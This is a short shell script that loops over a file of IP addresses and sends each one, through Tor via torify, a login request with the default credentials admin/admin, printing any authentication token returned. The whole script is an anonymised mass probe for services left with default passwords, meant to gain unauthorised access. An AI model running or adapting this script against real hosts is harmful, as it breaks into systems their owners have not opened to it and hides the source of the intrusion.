cat iplist | while read line
do
echo $line
echo ""
torify timeout 5 curl -s -H "Content-Type: application/json" -X POST $line/api/auth/login -d '{"username":"admin","password":"admin"}' | grep token
echo ""
echo ""
done
